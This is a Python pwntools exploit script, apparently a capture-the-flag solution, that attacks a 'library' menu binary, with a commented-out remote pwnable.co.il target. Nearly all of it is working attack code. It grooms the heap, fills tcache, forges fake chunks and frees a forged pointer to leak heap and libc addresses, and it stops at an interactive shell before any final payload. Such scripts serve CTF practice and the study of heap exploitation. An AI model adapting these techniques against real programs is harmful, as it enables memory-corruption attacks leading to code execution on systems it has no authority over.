from pwn import *

### arbitrary_pointer_write metadata ###
ARB_PTR_WRITE_CHK_ID = 0
ARB_CHK_ID_B = 0
EDITOR_CHK = 0
SAFE_CHK = 0
TMP_CHK_1 = 0
TMP_CHK_2 = 0

CHK_USR = p64(0x31) + p64(0) + p64(0x20) + b'\x30\x12'
CHK_PWD = p64(0) + p64(0) + p64(0x21)# + p64(0x61) + b'\x61'

p: process = None

def register(p: process, username: str = "user", password: str = "12345"):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Username: ", username)
    p.sendlineafter("Password: ", password)

def login(p: process, username: str = "user", password: str = "12345"):
    p.sendlineafter("Your choice: ", "2")
    p.sendlineafter("Username: ", username)
    p.sendlineafter("Password: ", password)

def borrow_book(p: process, book_idx: int = 0):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Which book do you want? ", str(book_idx))

def del_comment(p: process, id: int, book_idx: int = 0):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Which book did you leave the comment on? ", str(book_idx))
    p.sendlineafter("What is the comment id? ", str(id))
    print("deleted: ", id)

def return_book(p: process, add_comment: bool = False, comment_len: int = 50, comment: str = "comment", title: str = "title", need_id: bool = True) -> int:
    id = 0
    p.sendlineafter("Your choice: ", "2")
    if add_comment:
        p.sendlineafter("do you want to leave a comment? [Y/n] ", 'Y')
        p.sendlineafter("size of the comment: ", str(comment_len))
        p.sendlineafter("title: ", title)
        p.sendlineafter("content: ", comment)

        if need_id:
            data = p.recvline().decode().split(' ')[1]
            id = int(data)
            print("id: ", id)
        else:
            print("no id")
    else:
        p.sendline('n')

    return id

def logout(p: process):
    p.sendlineafter("Your choice: ", "4")

def create_comment(p: process, size: int, comment: str = "comment", book: int = 0, need_id: bool = True) -> int:
    borrow_book(p, book)
    return return_book(p, True, size, comment, "", need_id)

def fill_tcache(p: process, size: int, chunks: int = 7):
    ids = []
    for _ in range(chunks):
        #create_comment(p, 1200)
        ids.append(create_comment(p, size, "a"))

    for id in ids:
        del_comment(p, id)

def arb_chks_init(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    global SAFE_CHK
    global TMP_CHK_1
    global TMP_CHK_2

    id0 = create_comment(p, 0x1024)
    id1 = create_comment(p, 0x1024)
    create_comment(p, 0x1024, need_id=False)
    del_comment(p, id0)
    del_comment(p, id1)    

    EDITOR_CHK = create_comment(p, 0x1200)
    SAFE_CHK = create_comment(p, 0x1200)
    TMP_CHK_1 = create_comment(p, 0x1200, book=3)
    TMP_CHK_2 = create_comment(p, 0x1200, book=4)
    create_comment(p, 0x1200, book=4, need_id=False)
    del_comment(p, SAFE_CHK)
    SAFE_CHK = create_comment(p, 0x11a0)

    logout(p)
    register(p, CHK_USR, CHK_PWD)
    register(p)
    logout(p)
    login(p)

def parse_heap_leak_line(line: str):
    real_line = b'the full guide to insanity: heap exploitation" by rozav\n' + b'a' * 10 #padding
    addr = 0
    data = b''
    ok = False
    for rch, ch in zip(real_line, line[4:]):
        if ch == ord('"'):
            break
        if ch != rch:
            ok = True
        if ok:
            data += bytes([ch])

    return int.from_bytes(data, 'little')

def fill_tcache(p: process, size: int, chunks: int = 7):
    ids = []
    for _ in range(chunks):
        #create_comment(p, 1200)
        ids.append(create_comment(p, size, "a"))

    for id in ids:
        del_comment(p, id)

def leak_heap(p: process):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    global SAFE_CHK
    global TMP_CHK_1

    logout(p)
    login(p, CHK_USR, CHK_PWD)
    borrow_book(p, 2)
    logout(p)
    login(p)

    del_comment(p, EDITOR_CHK)
    EDITOR_CHK = create_comment(p, 0x1200, b'a' * (0x1200 - 0x20) + p64(0) + p64(0x11f1))

    del_comment(p, SAFE_CHK)
    SAFE_CHK = create_comment(p, 0x11e0, b'Y' * (0x11f0 - 0x58) + p64(0x6161) + (p64(0) * 3) + p64(0x6262) + p64(0) * 3)

    logout(p)
    login(p , "aa", "bb")

    del_comment(p, TMP_CHK_1, 3)
    return_book(p, True, 0x1200, need_id=False)
    
    p.sendlineafter("Your choice: ", "1")

    for i in range(2):
        p.recvline()

    line = p.recvline()
    leak = parse_heap_leak_line(line)
    print("heap leak: ", hex(leak))
    p.sendline("5")

    return leak

def leak_libc(p: process, heap_leak: int):
    global ARB_PTR_WRITE_CHK_ID
    global ARB_CHK_ID_B
    global EDITOR_CHK
    global SAFE_CHK
    global TMP_CHK_1
    global TMP_CHK_2

    bin_chks_ptr = heap_leak + 0x1240
    next_chk_ptr = bin_chks_ptr + 0x70 
    book_chk = heap_leak - 0x18
    libc_addr_ptr = heap_leak + 0x1210
    fake_chunks = b""

    for chk_idx in range(7):
        fake_chunks += p64(0) + p64(0x71) + p64(next_chk_ptr + chk_idx * 0x70) + p64(0x1337) + b'\x00' * 0x50
    fake_chunks += p64(0) + p64(0xf01) + p64(book_chk) + p64(0xcafe)# + b'\x00' * 0x5f0 + p64(0) + p64(0x610)
    print("len; ", len(fake_chunks))
    del_comment(p, TMP_CHK_2, 4)
    TMP_CHK_2 = create_comment(p, 0x1200, fake_chunks + (b'\x00' * (0x11e0 - len(fake_chunks))) + p64(0x1210) + p64(0x1211) + p64(bin_chks_ptr) + p32(0x145), book=4)

    borrow_book(p)

    for _ in range(7):
        del_comment(p, 0x1337, 4)

    #del book 0
    del_comment(p, 0x7770206873696e69, 4)
    return_book(p)

    book_id = create_comment(p, 0x60, "a" * 0x40, 0)
    p.sendlineafter("Your choice: ", "1")

    data = p.recvline()[-7:-1]

    book_addr = int.from_bytes(data, 'little')
    print("book:", hex(book_addr))
    p.sendline("5")

    heap_start = book_addr & 0xffff_ffff_ffff_f000

    del_comment(p, book_id, 0)
    book_id = create_comment(p, 0x60, b"b" * 0x10 + p64(0) + p64(((heap_leak - 0x10) - (book_addr + 0x30)) | 1) + p64(0) * 4 + p64(book_addr + 0x40), 0)

    del_comment(p, 0)
    p.sendlineafter("Your choice: ", "1")
    data = p.recvline()[:-1].split(b' ')[-1]
    p.sendline("5")

    libc = int.from_bytes(data, 'little') - 0x1ecbe0
    print("libc: ", hex(libc))
    return libc

def main():
    global p
    ### run ###
    p = process("./library")
    #p = remote("pwnable.co.il", 9010)

    ### setup ###
    register(p, "user", "12345")
    register(p, "user1", "12345")
    login(p)

    ### init ###
    arb_chks_init(p)

    ### leaks ###
    heap_leak = leak_heap(p)
    if heap_leak == 0:
        p.close()
        main()

    heap_start = (heap_leak - 0x7000) & 0xffff_ffff_ffff_f000
    print("heap: ", hex(heap_start))

    libc_leak = leak_libc(p, heap_leak)
    if libc_leak == 0:
        p.close()
        main()

    ### payload start ###
    p.interactive() 

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print("Error: ", e)
        p.close()
        main()